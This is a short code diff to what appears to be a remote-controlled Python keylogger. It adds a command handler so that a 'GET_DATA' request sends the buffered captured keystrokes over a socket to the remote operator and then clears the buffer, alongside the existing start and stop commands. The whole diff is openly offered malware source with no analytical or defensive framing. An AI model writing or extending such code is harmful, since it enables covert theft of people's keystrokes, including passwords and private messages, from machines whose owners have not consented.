@@ -14,11 +14,19 @@ KEYLOGGER_str = ''
 def KeyloggerAction(sock, data):
     action = data.split(b' ')[1] # get last argument from the keylogger args
     # print(action)
-    action = (action == b"START")
 
-    return __KeyloggerAction(action)
+    if action in [b'START', b'STOP']:
+        action = (action == b'START')
+        return __KeyloggerAction(action)
+    elif action == b'GET_DATA':
+        KeyLogger_GetData(sock)
+        return True
 
 
+def KeyLogger_GetData(sock):
+    global KEYLOGGER_str
+    print(sock.send(KEYLOGGER_str))
+    KEYLOGGER_str = ''
 
 
 # start/stop keylogger
